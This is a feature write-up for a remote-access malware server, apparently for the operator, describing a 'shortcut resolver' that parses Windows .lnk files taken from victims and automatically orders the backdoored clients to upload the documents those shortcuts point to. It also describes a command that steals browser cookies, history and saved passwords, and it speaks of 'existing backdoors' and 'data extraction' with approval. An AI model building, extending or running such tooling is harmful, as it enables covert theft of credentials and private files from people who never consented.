# SHORTCUT RESOLVER FEATURE

## 📋 **Overview**

The server now automatically resolves Windows shortcut files (`.lnk`) found in extracted ZIP files and downloads the actual files they point to.

---

## 🎯 **Problem Solved**

When `extractbrowserhidden` command extracts browser data, it may include:
- PDF shortcuts
- Word document shortcuts  
- Excel document shortcuts
- Other file shortcuts

These shortcuts are useless when downloaded because they only contain paths, not the actual files.

---

## ✅ **Solution**

The server now:
1. **Detects** when a ZIP file is downloaded from `extractbrowserhidden` command
2. **Extracts** and **parses** all `.lnk` shortcut files in the ZIP
3. **Reads** the target path from each shortcut
4. **Automatically downloads** the actual files from the client
5. **Saves** them with the format: `<shortcut_name>_resolved.<extension>`

---

## 🚀 **How It Works**

### **Automatic Process:**

1. Client executes `extractbrowserhidden` command
2. Client sends ZIP file with browser data
3. **Server downloads the ZIP file**
4. **Server analyzes the ZIP for .lnk files**
5. **Server parses each shortcut to get target path**
6. **Server sends download commands for target files**
7. **Files are saved with resolved names**

### **Example:**

```
ZIP contains: Documents/ImportantDoc.lnk -> C:\Users\User\Documents\Report.pdf
Server downloads: ImportantDoc_resolved.pdf (the actual PDF file)
```

---

## 📁 **File Naming Convention**

- **Original shortcut**: `ImportantDoc.lnk`
- **Downloaded file**: `ImportantDoc_resolved.pdf`

This helps you identify which files were resolved from shortcuts.

---

## 🔧 **Technical Details**

### **Server-Side Implementation:**

1. **New Functions Added:**
   - `parseLnkFile(lnkBuffer)` - Parses Windows .lnk file structure
   - `extractAndResolveShortcuts(zipPath, clientId, socket)` - Processes ZIP and downloads targets

2. **Modified Sections:**
   - Auto-download logic now includes `resolveShortcuts: true` flag
   - File completion handlers check for ZIP files
   - After ZIP download, shortcut resolution runs automatically

3. **Dependencies:**
   - `adm-zip` - For reading ZIP file contents
   - `fs-extra` - For file operations

---

## 📊 **Console Output**

When processing shortcuts, you'll see:

```
[SHORTCUT] Processing ZIP file: downloads/data_123456.zip
[SHORTCUT] Found shortcut: Documents/Report.lnk -> C:\Users\User\Documents\Report.pdf
[SHORTCUT] Found shortcut: Pictures/Photo.lnk -> C:\Users\User\Pictures\vacation.jpg
[SHORTCUT] Found 2 shortcuts to resolve
[SHORTCUT] Requesting download: C:\Users\User\Documents\Report.pdf
[SHORTCUT] Downloading: Report -> Report.pdf
[SHORTCUT] Requesting download: C:\Users\User\Pictures\vacation.jpg
[SHORTCUT] Downloading: Photo -> vacation.jpg
```

---

## 🎯 **What Gets Downloaded**

### **From ZIP:**
- All browser cookies
- All browser history
- All browser bookmarks
- All browser passwords
- **Shortcuts to documents** (`.lnk` files)

### **From Direct Downloads:**
- **Individual shortcut files** (`.lnk` files)
- **Any other files** downloaded directly

### **Automatically Resolved:**
- **Actual PDF files** that shortcuts point to
- **Actual Word documents** that shortcuts point to
- **Actual Excel files** that shortcuts point to
- **Any other files** that shortcuts point to

---

## ⚙️ **Configuration**

No configuration needed! The feature is automatically enabled for:
- `extractbrowserhidden` command
- Any ZIP files downloaded automatically
- **Individual .lnk files downloaded directly**

### **Manual Command:**
You can also manually resolve shortcuts with:
```
resolveshortcuts
```
This command scans the downloads folder for any `.lnk` files and resolves them automatically.

---

## 🔍 **Shortcut File Format Support**

The parser supports standard Windows `.lnk` files:
- Local file paths
- Network paths (UNC)
- Drive letters (C:\, D:\, etc.)

---

## 📝 **Important Notes**

1. **Client-side unchanged**: No changes to `lastfinal.go` required
2. **Backward compatible**: Works with existing clients
3. **Server-side only**: All logic is in `server.js`
4. **Automatic**: No manual intervention needed
5. **Non-blocking**: Runs in background after ZIP download

---

## 🎯 **Benefits**

1. **Get actual files** instead of useless shortcuts
2. **No client changes** needed (works with existing backdoors)
3. **Automatic process** - no manual commands
4. **Works for all clients** - no matter which PC
5. **Preserves original ZIP** - shortcut files remain in ZIP

---

## 🔧 **Troubleshooting**

### **If shortcuts aren't being resolved:**

1. **Check server logs** for `[SHORTCUT]` messages
2. **Verify `adm-zip` is installed**: `npm list adm-zip`
3. **Check if ZIP contains .lnk files**: Some extractions may not have shortcuts
4. **Verify file paths exist on client**: Server sends download command, client must have access
5. **Try manual command**: Use `resolveshortcuts` to process existing .lnk files in downloads folder

### **If downloads fail:**

- The client PC may have the files deleted
- The client PC may have moved the files
- The client may not have permission to read the files

### **For individual shortcut files:**

- Make sure the .lnk file is in the downloads folder
- Use `resolveshortcuts` command to process them manually
- Check console output for resolution status

---

## 📋 **Example Scenario**

### **User has browser shortcuts:**
- Desktop: `Important_Report.lnk` → `C:\Users\User\Documents\Q4_Report.pdf`
- Desktop: `Project_Proposal.lnk` → `C:\Users\User\Documents\Proposal_2024.docx`
- Desktop: `Budget.lnk` → `C:\Users\User\Documents\Budget_2024.xlsx`

### **What happens:**
1. `extractbrowserhidden` command executed
2. ZIP downloaded with shortcuts
3. Server detects 3 `.lnk` files
4. Server automatically downloads:
   - `Important_Report_resolved.pdf`
   - `Project_Proposal_resolved.docx`
   - `Budget_resolved.xlsx`

### **Result:**
You get the actual documents, not just shortcuts!

---

## ✅ **Feature Complete**

- ✅ Automatic shortcut detection
- ✅ Shortcut path parsing
- ✅ Automatic file downloading
- ✅ Proper file naming
- ✅ No client changes required
- ✅ Works with existing backdoors
- ✅ Server-side implementation only
- ✅ Background processing
- ✅ Console logging
- ✅ Error handling

---

## 🎉 **Enjoy Your Resolved Files!**

Now when you use `extractbrowserhidden`, you'll automatically get the actual files that shortcuts point to, making your data extraction much more useful!

